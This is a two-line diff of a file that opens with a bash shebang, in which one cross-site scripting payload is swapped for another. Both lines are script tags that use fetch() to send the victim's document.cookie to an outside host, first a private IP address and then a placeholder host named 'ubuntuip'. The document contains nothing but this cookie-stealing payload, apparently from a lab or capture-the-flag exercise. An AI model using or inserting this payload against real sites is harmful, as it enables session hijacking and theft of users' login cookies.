@@ -1,2 +1,2 @@
 #!/bin/bash
-<script>fetch('http://10.8.0.84/'+document.cookie)</script>
+<script>fetch("http://ubuntuip/.session="+document.cookie);</script>
